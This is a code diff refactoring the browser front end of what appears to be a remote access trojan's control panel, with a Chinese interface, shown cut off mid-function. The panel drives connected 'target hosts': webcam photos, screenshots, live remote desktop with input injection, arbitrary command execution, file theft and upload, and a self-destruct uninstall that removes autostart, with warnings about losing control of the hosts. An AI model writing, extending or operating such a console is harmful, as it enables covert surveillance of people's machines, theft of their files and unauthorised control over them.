+        <div class="modal-header">
+            <div class="modal-title">远程桌面 - 目标: <span id="vncTargetLabel"></span></div>
+            <div style="display: flex; gap: 12px; align-items: center;">
+                <div style="display: flex; gap: 8px; align-items: center; font-size: 14px; color: #9ca3af;">
+                    <span style="width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse 2s infinite;"></span>
+                    连接中
                 </div>
-                <button id="closeVncBtn" class="btn btn-danger btn-sm">关闭远程桌面</button>
+                <button id="closeVncBtn" class="btn btn-danger btn-sm">关闭</button>
             </div>
         </div>
-        <div class="vnc-content" id="vncContent">
-            <img id="vncScreen" draggable="false" alt="等待画面..." />
-            <div class="vnc-controls">
-                <button id="vncFullscreenBtn" class="vnc-control-btn">🔲 全屏</button>
-                <button id="vncRefreshBtn" class="vnc-control-btn">🔄 刷新</button>
-            </div>
+        <div class="modal-content">
+            <img id="vncScreen" draggable="false" alt="等待画面...">
+        </div>
+        <div class="vnc-controls">
+            <button id="vncFullscreenBtn" class="btn btn-primary btn-sm">🔲 全屏</button>
+            <button id="vncRefreshBtn" class="btn btn-secondary btn-sm">🔄 刷新</button>
         </div>
     </div>
-    
-    <!-- Socket.IO 和 jQuery -->
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
-    
+
     <script>
-        // Socket.IO 连接
         const socket = io();
-        
-        // DOM 元素
-        const serverStatus = document.getElementById('serverStatus');
-        const shootBtn = document.getElementById('shootBtn');
-        const screenshotBtn = document.getElementById('screenshotBtn');
-        const vncBtn = document.getElementById('vncBtn');
-        const restartBtn = document.getElementById('restartBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const uninstallBtn = document.getElementById('uninstallBtn');
-        const targetClient = document.getElementById('targetClient');
-        const controlMessage = document.getElementById('controlMessage');
-        const clientsList = document.getElementById('clientsList');
-        const clientsCount = document.getElementById('clientsCount');
-        const photosList = document.getElementById('photosList');
-        const photosCount = document.getElementById('photosCount');
-        const refreshBtn = document.getElementById('refreshBtn');
 
-        // 命令执行 DOM
-        const commandInput = document.getElementById('commandInput');
-        const executeBtn = document.getElementById('executeBtn');
-        const commandOutput = document.getElementById('commandOutput');
-
-        // 文件管理 DOM
-        const dirPathInput = document.getElementById('dirPathInput');
-        const listDirBtn = document.getElementById('listDirBtn');
-        const fileUploadInput = document.getElementById('fileUploadInput');
-        const uploadFileBtn = document.getElementById('uploadFileBtn');
-        const fileListBody = document.getElementById('fileListBody');
-        const fileMessage = document.getElementById('fileMessage');
-        
-        // VNC DOM
-        const vncModal = document.getElementById('vncModal');
-        const vncScreen = document.getElementById('vncScreen');
-        const closeVncBtn = document.getElementById('closeVncBtn');
-        const vncTargetLabel = document.getElementById('vncTargetLabel');
+        // State
+        let onlineClients = [];
         let isVncActive = false;
         let lastVncFrameTime = 0;
         let lastVncMoveTime = 0;
-        
-        // 当前在线客户端
-        let onlineClients = [];
-        
-        // HTML 转义防 XSS
+        let currentPath = '';
+        let executingClients = { shoot: null, screenshot: null, execute: null };
+
+        // DOM Elements
+        const targetClient = document.getElementById('targetClient');
+        const fileTargetClient = document.getElementById('fileTargetClient');
+        const serverStatus = document.getElementById('serverStatus');
+        const statusDot = document.getElementById('statusDot');
+        const controlMessage = document.getElementById('controlMessage');
+
+        // Tab Navigation
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const tabId = this.getAttribute('data-tab');
+                
+                // Update tabs
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                
+                // Update content
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                document.getElementById(tabId + '-tab').classList.add('active');
+            });
+        });
+
+        // Escape HTML
         function escapeHtml(unsafe) {
             return (unsafe || '').toString()
-                 .replace(/&/g, "&amp;")
-                 .replace(/</g, "&lt;")
-                 .replace(/>/g, "&gt;")
-                 .replace(/"/g, "&quot;")
-                 .replace(/'/g, "&#039;");
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
         }
 
-        // 显示消息
-        function showMessage(message, type = 'info') {
-            controlMessage.innerHTML = `<div class="message ${type}">${message}</div>`;
+        // Show Message
+        function showMessage(element, message, type = 'info') {
+            element.innerHTML = `<div class="message ${type}">${message}</div>`;
             setTimeout(() => {
-                controlMessage.innerHTML = '';
+                element.innerHTML = '';
             }, 3000);
         }
 
-        function showFileMessage(message, type = 'info') {
-            fileMessage.innerHTML = `<span style="color: ${type === 'error' ? '#ea4335' : '#34a853'}">${message}</span>`;
-            setTimeout(() => {
-                fileMessage.innerHTML = '';
-            }, 3000);
-        }
-        
-        // 按钮状态管理，记录正在执行操作的客户端 ID
-        let executingClients = {
-            shoot: null,
-            screenshot: null,
-            execute: null
-        };
-
-        // 更新按钮状态
+        // Update Buttons State
         function updateButtonsState(disabled) {
-            [shootBtn, screenshotBtn, vncBtn, restartBtn, stopBtn, uninstallBtn, executeBtn, listDirBtn, uploadFileBtn].forEach(btn => {
+            const buttons = [
+                document.getElementById('shootBtn'),
+                document.getElementById('screenshotBtn'),
+                document.getElementById('vncBtn'),
+                document.getElementById('restartBtn'),
+                document.getElementById('stopBtn'),
+                document.getElementById('uninstallBtn'),
+                document.getElementById('executeBtn'),
+                document.getElementById('listDirBtn'),
+                document.getElementById('uploadFileBtn')
+            ];
+            
+            buttons.forEach(btn => {
                 if (btn) btn.disabled = disabled;
             });
-            
-            // 如果存在未完成的任务，针对当前选中的客户端恢复禁用状态
-            const currentClient = targetClient.value;
-            if (!disabled) {
-                if (executingClients.shoot === currentClient) shootBtn.disabled = true;
-                if (executingClients.screenshot === currentClient) screenshotBtn.disabled = true;
-                if (executingClients.execute === currentClient) executeBtn.disabled = true;
-            }
         }
-        
-        // 更新客户端列表和下拉框
+
+        // Sync Client Selectors
+        function syncClientSelectors() {
+            const value = targetClient.value;
+            fileTargetClient.innerHTML = targetClient.innerHTML;
+            fileTargetClient.value = value === 'all' ? '' : value;
+        }
+
+        // Update Clients List
         function updateClientsList() {
+            const clientsCount = document.getElementById('clientsCount');
+            const clientsGrid = document.getElementById('clientsGrid');
+            
+            clientsCount.textContent = onlineClients.length;
+            
             if (onlineClients.length === 0) {
-                clientsList.innerHTML = '<div style="text-align: center; color: #666; font-style: italic;">暂无在线客户端</div>';
+                clientsGrid.innerHTML = `
+                    <div style="grid-column: 1 / -1;">
+                        <div class="empty-state">
+                            <div class="empty-icon">📱</div>
+                            <div class="empty-title">暂无在线客户端</div>
+                            <div class="empty-desc">等待客户端连接...</div>
+                        </div>
+                    </div>
+                `;
                 updateButtonsState(true);
                 
                 targetClient.innerHTML = '<option value="all">所有客户端</option>';
+                fileTargetClient.innerHTML = '<option value="">选择客户端...</option>';
             } else {
-                clientsList.innerHTML = onlineClients.map(clientId => 
-                    `<div class="client-item">🟢 ${escapeHtml(clientId)}</div>`
-                ).join('');
+                clientsGrid.innerHTML = onlineClients.map(clientId => `
+                    <div class="client-card">
+                        <div class="client-avatar">🖥️</div>
+                        <div class="client-info">
+                            <div class="client-id">${escapeHtml(clientId)}</div>
+                            <div class="client-status">● 在线</div>
+                        </div>
+                    </div>
+                `).join('');
+                
                 updateButtonsState(false);
                 
-                // 保存当前选中的值
                 const currentValue = targetClient.value;
                 targetClient.innerHTML = '<option value="all">所有客户端</option>' + 
                     onlineClients.map(clientId => `<option value="${escapeHtml(clientId)}">${escapeHtml(clientId)}</option>`).join('');
+                fileTargetClient.innerHTML = '<option value="">选择客户端...</option>' + 
+                    onlineClients.map(clientId => `<option value="${escapeHtml(clientId)}">${escapeHtml(clientId)}</option>`).join('');
                 
-                // 尝试恢复选中的值
                 if (currentValue && targetClient.querySelector(`option[value="${currentValue}"]`)) {
                     targetClient.value = currentValue;
+                    fileTargetClient.value = currentValue;
                 }
             }
-            clientsCount.textContent = onlineClients.length;
         }
-        
-        // 加载照片列表
+
+        // Load Photos
         function loadPhotos() {
+            const photosGrid = document.getElementById('photosGrid');
+            const photosCount = document.getElementById('photosCount');
+            
             $.ajax({
                 url: '/photos',
                 method: 'GET',
                 success: function(photos) {
+                    photosCount.textContent = photos.length;
+                    
                     if (photos.length === 0) {
-                        photosList.innerHTML = '<div style="text-align: center; color: #666; font-style: italic;">暂无照片</div>';
+                        photosGrid.innerHTML = `
+                            <div style="grid-column: 1 / -1;">
+                                <div class="empty-state">
+                                    <div class="empty-icon">📷</div>
+                                    <div class="empty-title">暂无照片</div>
+                                    <div class="empty-desc">拍摄照片或抓取屏幕后，照片会显示在这里</div>
+                                </div>
+                            </div>
+                        `;
                     } else {
-                        photosList.innerHTML = photos.map(photo => {
+                        photosGrid.innerHTML = photos.map(photo => {
                             const date = new Date(photo.timestamp * 1000);
                             const formattedDate = date.toLocaleString('zh-CN');
                             const size = (photo.size / 1024).toFixed(2);
                             return `
-                <div class="photo-item">
-                    <div class="photo-info">
-                        <div class="photo-name">${escapeHtml(photo.filename)}</div>
-                        <div class="photo-meta">
-                            ${formattedDate} • ${size} KB
-                        </div>
-                    </div>
-                    <a href="/photos/${escapeHtml(photo.filename)}" class="btn btn-secondary btn-sm" download>
-                        下载
-                    </a>
-                </div>
-            `;
+                                <div class="photo-card">
+                                    <img src="/photos/${escapeHtml(photo.filename)}" class="photo-preview" alt="${escapeHtml(photo.filename)}">
+                                    <div class="photo-info">
+                                        <div class="photo-name">${escapeHtml(photo.filename)}</div>
+                                        <div class="photo-meta">
+                                            <span>${formattedDate}</span>
+                                            <a href="/photos/${escapeHtml(photo.filename)}" class="btn btn-primary btn-sm" download>下载</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            `;
                         }).join('');
                     }
-                    photosCount.textContent = photos.length;
                 },
                 error: function() {
-                    showMessage('加载照片列表失败', 'error');
+                    console.error('Failed to load photos');
                 }
             });
         }
-        
-        // Socket.IO 事件处理
-        socket.on('connect', function() {
-            console.log('已连接到服务器');
-            serverStatus.className = 'status online';
-            serverStatus.innerHTML = '服务器状态：在线';
+
+        // Update Breadcrumb
+        function updateBreadcrumb(path) {
+            const breadcrumb = document.getElementById('breadcrumb');
+            if (!path) {
+                breadcrumb.innerHTML = '<span class="breadcrumb-item" data-path="">📂 根目录</span>';
+                return;
+            }
             
-            // 加载客户端列表
+            const parts = path.split(/[\\/]/).filter(p => p);
+            let html = '<span class="breadcrumb-item" data-path="">📂 根</span>';
+            
+            let current = '';
+            parts.forEach((part, index) => {
+                if (index === 0 && part.includes(':')) {
+                    current = part + '\\';
+                } else {
+                    current = current ? current + (current.endsWith('\\') ? '' : '\\') + part : part;
+                }
+                
+                html += '<span class="breadcrumb-separator">›</span>';
+                html += `<span class="breadcrumb-item" data-path="${escapeHtml(current)}">${escapeHtml(part)}</span>`;
+            });
+            
+            breadcrumb.innerHTML = html;
+            
+            // Bind click events
+            breadcrumb.querySelectorAll('.breadcrumb-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    const path = this.getAttribute('data-path');
+                    document.getElementById('dirPathInput').value = path;
+                    listDir(path);
+                });
+            });
+        }
+
+        // List Directory
+        function listDir(path) {
+            const clientId = fileTargetClient.value;
+            const listDirBtn = document.getElementById('listDirBtn');
+            const fileListBody = document.getElementById('fileListBody');
+            const fileMessage = document.getElementById('fileMessage');
+            
+            if (!clientId) {
+                showMessage(fileMessage, '请选择特定客户端', 'error');
+                return;
+            }
+            if (!path) {
+                showMessage(fileMessage, '请输入绝对路径', 'error');
+                return;
+            }
+            
+            listDirBtn.disabled = true;
+            listDirBtn.innerHTML = '<span class="loading"></span> 加载中...';
+            currentPath = path;
+            updateBreadcrumb(path);
+            
+            socket.emit('list_dir', { client_id: clientId, path: path });
+        }
+
+        // Download File
+        function downloadFile(filename) {
+            const clientId = fileTargetClient.value;
+            const fileMessage = document.getElementById('fileMessage');
+            
+            if (!clientId) {
+                showMessage(fileMessage, '请选择特定客户端', 'error');
+                return;
+            }
+            
+            const fullPath = currentPath + (currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\') + filename;
+            showMessage(fileMessage, `请求下载 ${filename}...`, 'info');
+            socket.emit('request_download', { client_id: clientId, path: fullPath, filename: filename });
+        }
+
+        // Navigate to Directory
+        function navigateToDirectory(dirName) {
+            let newPath;
+            if (currentPath.endsWith('\\') || currentPath.endsWith('/')) {
+                newPath = currentPath + dirName;
+            } else {
+                newPath = currentPath + '\\' + dirName;
+            }
+            document.getElementById('dirPathInput').value = newPath;
+            listDir(newPath);
+        }
+
+        // Socket.IO Events
+        socket.on('connect', function() {
+            serverStatus.textContent = '服务器在线';
+            statusDot.classList.add('online');
+            
+            // Load clients and photos
             $.ajax({
                 url: '/clients',
                 method: 'GET',
@@ -809,259 +1125,49 @@
                     updateClientsList();
                 }
             });
-            
-            // 加载照片列表
             loadPhotos();
         });
-        
+
         socket.on('disconnect', function() {
-            console.log('与服务器断开连接');
-            serverStatus.className = 'status offline';
-            serverStatus.innerHTML = '服务器状态：离线';
+            serverStatus.textContent = '服务器离线';
+            statusDot.classList.remove('online');
             onlineClients = [];
             updateClientsList();
         });
-        
+
         socket.on('client_connected', function(data) {
-            console.log('客户端连接：', data.client_id);
             if (!onlineClients.includes(data.client_id)) {
                 onlineClients.push(data.client_id);
                 updateClientsList();
             }
         });
-        
+
         socket.on('client_disconnected', function(data) {
-            console.log('客户端断开：', data.client_id);
             onlineClients = onlineClients.filter(id => id !== data.client_id);
             updateClientsList();
         });
-        
-        // 拍摄按钮点击事件
-        shootBtn.addEventListener('click', function() {
-            const clientId = targetClient.value;
-            shootBtn.disabled = true;
-            shootBtn.innerHTML = '<div class="loading"></div> 发送中...';
-            
-            $.ajax({
-                url: '/shoot',
-                method: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify({ client_id: clientId }),
-                success: function(response) {
-                    showMessage('拍摄指令已发送，等待照片上传...', 'info');
-                    console.log('拍摄指令发送成功');
-                    // 按钮恢复状态移到了 photo_uploaded 事件中处理，或设置超时恢复
-                    setTimeout(() => {
-                        if(shootBtn.disabled) {
-                            shootBtn.disabled = false;
-                            shootBtn.innerHTML = '📷 拍摄照片';
-                            showMessage('等待照片超时，请检查客户端是否正常工作', 'error');
-                        }
-                    }, 15000); // 15秒超时
-                },
-                error: function() {
-                    showMessage('拍摄指令发送失败', 'error');
-                    shootBtn.disabled = false;
-                    shootBtn.innerHTML = '📷 拍摄照片';
-                }
-            });
-        });
 
-        // 抓取屏幕按钮点击事件
-        screenshotBtn.addEventListener('click', function() {
-            const clientId = targetClient.value;
-            screenshotBtn.disabled = true;
-            screenshotBtn.innerHTML = '<div class="loading"></div> 发送中...';
-            executingClients.screenshot = clientId;
+        socket.on('photo_uploaded', function() {
+            loadPhotos();
+            showMessage(controlMessage, '新照片已成功上传！', 'success');
             
-            socket.emit('take_screenshot', { client_id: clientId });
-            showMessage('屏幕抓取指令已发送，等待上传...', 'info');
+            executingClients.shoot = null;
+            executingClients.screenshot = null;
             
-            setTimeout(() => {
-                executingClients.screenshot = null;
-                if(targetClient.value === clientId) {
-                    screenshotBtn.disabled = false;
-                    screenshotBtn.innerHTML = '🖥️ 抓取屏幕';
-                    showMessage('等待截图超时，请检查客户端是否正常工作', 'error');
-                }
-            }, 15000);
-        });
-
-        // VNC 控制逻辑
-        vncBtn.addEventListener('click', function() {
-            const clientId = targetClient.value;
-            if (clientId === 'all') {
-                showMessage('远程桌面请选择特定客户端', 'error');
-                return;
-            }
-            
-            isVncActive = true;
-            vncTargetLabel.textContent = clientId;
-            vncModal.style.display = 'block';
-            vncScreen.src = '';
-            document.body.style.overflow = 'hidden'; // 防止背景滚动
-            
-            socket.emit('start_vnc', { client_id: clientId });
-        });
-
-        closeVncBtn.addEventListener('click', function() {
-            isVncActive = false;
-            vncModal.style.display = 'none';
-            document.body.style.overflow = 'auto';
-            
-            // 退出全屏模式
-            if (document.fullscreenElement) {
-                document.exitFullscreen();
-            }
-            
-            socket.emit('stop_vnc', { client_id: targetClient.value });
-        });
-        
-        // 全屏按钮功能
-        document.getElementById('vncFullscreenBtn').addEventListener('click', function() {
-            const vncContent = document.getElementById('vncContent');
-            if (!document.fullscreenElement) {
-                vncContent.requestFullscreen().catch(err => {
-                    console.error('无法进入全屏模式:', err);
-                });
-            } else {
-                document.exitFullscreen();
-            }
-        });
-        
-        // 刷新按钮功能
-        document.getElementById('vncRefreshBtn').addEventListener('click', function() {
-            const clientId = targetClient.value;
-            socket.emit('stop_vnc', { client_id: clientId });
-            setTimeout(() => {
-                socket.emit('start_vnc', { client_id: clientId });
-            }, 500);
-        });
-
-        socket.on('vnc_frame', function(data) {
-            if (!isVncActive) return;
-            
-            // 简单的防抖/限流，防止积压导致浏览器卡死
-            const now = Date.now();
-            if (now - lastVncFrameTime > 50) { // 限制最高 20fps 更新渲染
-                vncScreen.src = 'data:image/jpeg;base64,' + data.image;
-                lastVncFrameTime = now;
-            }
-        });
-
-        // 屏蔽 VNC 画面内的右键菜单
-        vncScreen.addEventListener('contextmenu', e => e.preventDefault());
-
-        // 鼠标事件发送
-        function sendVncMouseEvent(e, action) {
-            if (!isVncActive) return;
-            e.preventDefault();
-            
-            const rect = vncScreen.getBoundingClientRect();
-            // 计算相对坐标 (0.0 - 1.0)
-            const x = (e.clientX - rect.left) / rect.width;
-            const y = (e.clientY - rect.top) / rect.height;
-            
-            // 越界检查
-            if (x < 0 || x > 1 || y < 0 || y > 1) return;
-            
-            socket.emit('vnc_mouse_event', {
-                client_id: targetClient.value,
-                action: action,
-                x: x,
-                y: y,
-                button: e.button // 0=left, 1=middle, 2=right
-            });
-        }
-
-        vncScreen.addEventListener('mousemove', e => {
-            // 节流处理，最高约 30fps 的鼠标移动上报，避免服务器和网络阻塞
-            if (e.buttons > 0) {
-                const now = Date.now();
-                if (now - lastVncMoveTime > 30) {
-                    sendVncMouseEvent(e, 'move');
-                    lastVncMoveTime = now;
-                }
-            }
-        });
-        vncScreen.addEventListener('mousedown', e => sendVncMouseEvent(e, 'down'));
-        vncScreen.addEventListener('mouseup', e => sendVncMouseEvent(e, 'up'));
-
-        // 键盘事件发送
-        window.addEventListener('keydown', e => {
-            if (!isVncActive) return;
-            e.preventDefault(); // 阻止浏览器默认快捷键
-            socket.emit('vnc_key_event', {
-                client_id: targetClient.value,
-                action: 'down',
-                keyCode: e.keyCode
-            });
-        });
-
-        window.addEventListener('keyup', e => {
-            if (!isVncActive) return;
-            e.preventDefault();
-            socket.emit('vnc_key_event', {
-                client_id: targetClient.value,
-                action: 'up',
-                keyCode: e.keyCode
-            });
-        });
-
-        // 客户端状态控制逻辑
-        function sendClientControl(action) {
-            const clientId = targetClient.value;
-            if (clientId === 'all' && action === 'uninstall') {
-                if (!confirm('⚠️ 警告：您选择了所有客户端进行卸载自毁！这会导致所有主机丢失控制权且无法恢复。是否继续？')) return;
-            } else if (action === 'uninstall') {
-                if (!confirm('⚠️ 警告：卸载自毁将删除目标主机上的程序并取消自启，且立刻断开连接。是否继续？')) return;
-            } else if (action === 'stop') {
-                if (!confirm('提示：停止运行后客户端将下线，直到目标主机下次被手动启动才会恢复连接。是否继续？')) return;
-            } else if (action === 'restart') {
-                if (!confirm('提示：将重启目标客户端进程，可能会短暂断开连接。是否继续？')) return;
-            }
-            
-            socket.emit('client_control', { client_id: clientId, action: action });
-            showMessage(`已发送 ${action} 指令`, 'info');
-        }
-
-        restartBtn.addEventListener('click', () => sendClientControl('restart'));
-        stopBtn.addEventListener('click', () => sendClientControl('stop'));
-        uninstallBtn.addEventListener('click', () => sendClientControl('uninstall'));
-
-        // 命令执行逻辑
-        executeBtn.addEventListener('click', function() {
-            const clientId = targetClient.value;
-            const command = commandInput.value.trim();
-            if (!command) {
-                showMessage('请输入命令', 'error');
-                return;
-            }
-            if (clientId === 'all') {
-                showMessage('命令执行请选择特定客户端', 'error');
-                return;
-            }
-            
-            executeBtn.disabled = true;
-            executeBtn.innerHTML = '执行中...';
-            commandOutput.innerHTML = '正在发送命令...\n';
-            executingClients.execute = clientId;
-            
-            socket.emit('execute_command', { client_id: clientId, command: command });
-            
-            // 恢复按钮状态，并设置超时
-            setTimeout(() => {
-                executingClients.execute = null;
-                if(targetClient.value === clientId) {
-                    executeBtn.disabled = false;
-                    executeBtn.innerHTML = '执行';
-                }
-            }, 30000); // 30秒超时
+            const shootBtn = document.getElementById('shootBtn');
+            const screenshotBtn = document.getElementById('screenshotBtn');
+            shootBtn.disabled = false;
+            shootBtn.innerHTML = '📷 拍摄照片';
+            screenshotBtn.disabled = false;
+            screenshotBtn.innerHTML = '🖥️ 抓取屏幕';
         });
 
         socket.on('command_result', function(data) {
+            const commandOutput = document.getElementById('commandOutput');
+            const executeBtn = document.getElementById('executeBtn');
+            
             executingClients.execute = null;
-            if(targetClient.value === data.client_id || data.client_id === undefined) {
+            if (targetClient.value === data.client_id || data.client_id === undefined) {
                 executeBtn.disabled = false;
                 executeBtn.innerHTML = '执行';
             }
@@ -1079,7 +1185,7 @@
             const outLine = document.createElement('div');
             outLine.textContent = outputText;
             if (isError) {
-                outLine.style.color = '#ff0000';
+                outLine.style.color = '#ff6b6b';
             }
             
             commandOutput.appendChild(cmdLine);
@@ -1087,112 +1193,86 @@
             commandOutput.appendChild(document.createTextNode('\n'));
             commandOutput.scrollTop = commandOutput.scrollHeight;
         });
-        
-        // 监听新照片上传事件
-        socket.on('photo_uploaded', function() {
-            console.log('收到新照片通知');
-            loadPhotos();
-            showMessage('新照片已成功上传并刷新！', 'success');
-            
-            // 清除正在执行的状态
-            executingClients.shoot = null;
-            executingClients.screenshot = null;
-            
-            // 恢复拍摄按钮状态
-            shootBtn.disabled = false;
-            shootBtn.innerHTML = '📷 拍摄照片';
-            
-            screenshotBtn.disabled = false;
-            screenshotBtn.innerHTML = '🖥️ 抓取屏幕';
-        });
-        
-        // 文件管理逻辑
-        let currentPath = '';
-
-        // 更新当前路径显示
-        function updateCurrentPathDisplay() {
-            const pathDisplay = document.getElementById('currentPathDisplay');
-            if (currentPath) {
-                pathDisplay.textContent = currentPath;
-                pathDisplay.style.fontWeight = '500';
-                pathDisplay.style.color = 'var(--primary-color)';
-            } else {
-                pathDisplay.textContent = '未选择';
-                pathDisplay.style.fontWeight = 'normal';
-                pathDisplay.style.color = 'var(--text-secondary)';
-            }
-        }
-
-        // 切换客户端时重置文件列表和当前路径
-        targetClient.addEventListener('change', function() {
-            currentPath = '';
-            dirPathInput.value = '';
-            fileListBody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 20px; color: var(--text-secondary); font-style: italic;">请输入路径并点击"列出目录"</td></tr>';
-            updateCurrentPathDisplay();
-            updateButtonsState(onlineClients.length === 0);
-        });
-
-        listDirBtn.addEventListener('click', function() {
-            const clientId = targetClient.value;
-            const path = dirPathInput.value.trim();
-            
-            if (clientId === 'all') {
-                showFileMessage('请选择特定客户端', 'error');
-                return;
-            }
-            if (!path) {
-                showFileMessage('请输入绝对路径', 'error');
-                return;
-            }
-            
-            listDirBtn.disabled = true;
-            listDirBtn.innerHTML = '<div class="loading"></div> 加载中...';
-            currentPath = path;
-            updateCurrentPathDisplay();
-            
-            socket.emit('list_dir', { client_id: clientId, path: path });
-        });
 
         socket.on('dir_list_result', function(data) {
+            const listDirBtn = document.getElementById('listDirBtn');
+            const fileListBody = document.getElementById('fileListBody');
+            const fileMessage = document.getElementById('fileMessage');
+            
             listDirBtn.disabled = false;
             listDirBtn.innerHTML = '📂 列出目录';
             
             if (data.error) {
-                showFileMessage('目录读取失败: ' + data.error, 'error');
+                showMessage(fileMessage, '目录读取失败: ' + data.error, 'error');
+                fileListBody.innerHTML = `
+                    <tr>
+                        <td colspan="5">
+                            <div class="empty-state">
+                                <div class="empty-icon">❌</div>
+                                <div class="empty-title">读取失败</div>
+                                <div class="empty-desc">${escapeHtml(data.error)}</div>
+                            </div>
+                        </td>
+                    </tr>
+                `;
                 return;
             }
             
             if (data.files.length === 0) {
-                fileListBody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 10px; color: #666;">目录为空</td></tr>';
+                fileListBody.innerHTML = `
+                    <tr>
+                        <td colspan="5">
+                            <div class="empty-state">
+                                <div class="empty-icon">📂</div>
+                                <div class="empty-title">目录为空</div>
+                                <div class="empty-desc">此目录中没有文件</div>
+                            </div>
+                        </td>
+                    </tr>
+                `;
             } else {
-                // 排序，文件夹在前
+                // Sort - directories first
                 data.files.sort((a, b) => {
                     if (a.is_dir && !b.is_dir) return -1;
                     if (!a.is_dir && b.is_dir) return 1;
                     return a.name.localeCompare(b.name);
                 });
                 
-                fileListBody.innerHTML = data.files.map((file, index) => {
+                fileListBody.innerHTML = data.files.map((file) => {
                     const date = new Date(file.mtime * 1000);
                     const formattedDate = date.toLocaleString('zh-CN');
                     const size = file.is_dir ? '-' : (file.size / 1024).toFixed(2) + ' KB';
                     const icon = file.is_dir ? '📁' : '📄';
-                    const dlBtn = file.is_dir ? '' : `<button class="file-download-btn btn btn-secondary btn-sm" data-filename="${escapeHtml(file.name)}">下载</button>`;
+                    const dlBtn = file.is_dir ? '' : `<button class="btn btn-secondary btn-sm file-download-btn" data-filename="${escapeHtml(file.name)}">下载</button>`;
+                    const rowClass = file.is_dir ? 'file-row dir' : 'file-row';
                     
                     return `
-                        <tr>
-                            <td>${icon} ${escapeHtml(file.name)}</td>
+                        <tr class="${rowClass}" data-name="${escapeHtml(file.name)}" data-isdir="${file.is_dir}">
+                            <td>
+                                <div class="file-name">
+                                    <span class="file-icon">${icon}</span>
+                                    ${escapeHtml(file.name)}
+                                </div>
+                            </td>
                             <td>${file.is_dir ? '文件夹' : '文件'}</td>
-                            <td>${size}</td>
+                            <td class="file-size">${size}</td>
                             <td>${formattedDate}</td>
                             <td>${dlBtn}</td>
                         </tr>
                     `;
                 }).join('');
                 
-                // 绑定下载按钮事件
-                document.querySelectorAll('.file-download-btn').forEach(btn => {
-                    btn.addEventListener('click', function() {
+                // Bind click events for directories and download buttons
+                fileListBody.querySelectorAll('.file-row.dir').forEach(row => {
+                    row.addEventListener('click', function() {
+                        const name = this.getAttribute('data-name');
+                        navigateToDirectory(name);
+                    });
+                });
+                
+                fileListBody.querySelectorAll('.file-download-btn').forEach(btn => {
+                    btn.addEventListener('click', function(e) {
+                        e.stopPropagation();
                         const filename = this.getAttribute('data-filename');
                         downloadFile(filename);
                     });
@@ -1200,26 +1280,15 @@
             }
         });
 
-        function downloadFile(filename) {
-            const clientId = targetClient.value;
-            if (clientId === 'all') {
-                showFileMessage('请选择特定客户端以进行下载', 'error');
-                return;
-            }
-            const fullPath = currentPath + (currentPath.endsWith('\\') ? '' : '\\') + filename;
-            
-            showFileMessage(`请求下载 ${filename}...`);
-            socket.emit('request_download', { client_id: clientId, path: fullPath, filename: filename });
-        }
-
         socket.on('file_download_ready', function(data) {
+            const fileMessage = document.getElementById('fileMessage');
+            
             if (data.error) {
-                showFileMessage('下载失败: ' + data.error, 'error');
+                showMessage(fileMessage, '下载失败: ' + data.error, 'error');
                 return;
             }
             
-            showFileMessage('文件准备就绪，开始下载...', 'success');
-            // 创建隐藏链接自动下载
+            showMessage(fileMessage, '文件准备就绪，开始下载...', 'success');
             const a = document.createElement('a');
             a.href = data.url;
             a.download = data.filename;
@@ -1228,29 +1297,187 @@
             document.body.removeChild(a);
         });
 
-        uploadFileBtn.addEventListener('click', function() {
+        socket.on('client_upload_complete', function(data) {
+            const fileMessage = document.getElementById('fileMessage');
+            const uploadFileBtn = document.getElementById('uploadFileBtn');
+            const fileUploadInput = document.getElementById('fileUploadInput');
+            
+            if (data.error) {
+                showMessage(fileMessage, '客户端接收文件失败: ' + data.error, 'error');
+            } else {
+                showMessage(fileMessage, '客户端已成功接收文件！', 'success');
+                // Refresh directory
+                if (currentPath) {
+                    listDir(currentPath);
+                }
+            }
+            uploadFileBtn.disabled = false;
+            uploadFileBtn.innerHTML = '📤 上传文件';
+            fileUploadInput.value = '';
+        });
+
+        socket.on('vnc_frame', function(data) {
+            if (!isVncActive) return;
+            
+            const now = Date.now();
+            if (now - lastVncFrameTime > 50) {
+                document.getElementById('vncScreen').src = 'data:image/jpeg;base64,' + data.image;
+                lastVncFrameTime = now;
+            }
+        });
+
+        // Event Listeners
+        targetClient.addEventListener('change', syncClientSelectors);
+
+        // Dashboard Controls
+        document.getElementById('shootBtn').addEventListener('click', function() {
+            const clientId = targetClient.value;
+            this.disabled = true;
+            this.innerHTML = '<span class="loading"></span> 发送中...';
+            
+            $.ajax({
+                url: '/shoot',
+                method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ client_id: clientId }),
+                success: function() {
+                    showMessage(controlMessage, '拍摄指令已发送，等待照片上传...', 'info');
+                },
+                error: function() {
+                    showMessage(controlMessage, '拍摄指令发送失败', 'error');
+                }
+            });
+        });
+
+        document.getElementById('screenshotBtn').addEventListener('click', function() {
+            const clientId = targetClient.value;
+            this.disabled = true;
+            this.innerHTML = '<span class="loading"></span> 发送中...';
+            executingClients.screenshot = clientId;
+            
+            socket.emit('take_screenshot', { client_id: clientId });
+            showMessage(controlMessage, '屏幕抓取指令已发送，等待上传...', 'info');
+        });
+
+        document.getElementById('vncBtn').addEventListener('click', function() {
             const clientId = targetClient.value;
             if (clientId === 'all') {
-                showFileMessage('请选择特定客户端', 'error');
+                showMessage(controlMessage, '远程桌面请选择特定客户端', 'error');
+                return;
+            }
+            
+            isVncActive = true;
+            document.getElementById('vncTargetLabel').textContent = clientId;
+            document.getElementById('vncModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
